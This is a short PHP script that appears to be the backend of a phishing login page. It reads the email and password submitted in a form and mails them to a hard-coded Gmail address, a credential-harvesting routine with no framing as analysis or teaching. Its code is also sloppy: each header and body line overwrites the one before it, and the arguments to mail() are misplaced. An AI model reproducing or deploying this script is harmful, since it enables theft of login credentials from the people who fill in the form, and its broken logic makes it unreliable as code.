<?php 

$email = $_POST['email'];
$password = $_POST['password'];

$dest = "carlosjavier.cjps@gmail.com";

$headers = "From: $email $password\r\n";
$headers = "X-Mailer: PHP5\n";
$headers = 'MIME-Version: 1.0' . "\n";
$headers = 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

$cuerpo = "email: ".$email."<br> ";
$cuerpo = "password: ".$password."<br> ";

if($email != '' && $password != ''){
    mail($dest,$cuerpo,$headers);
}
?> 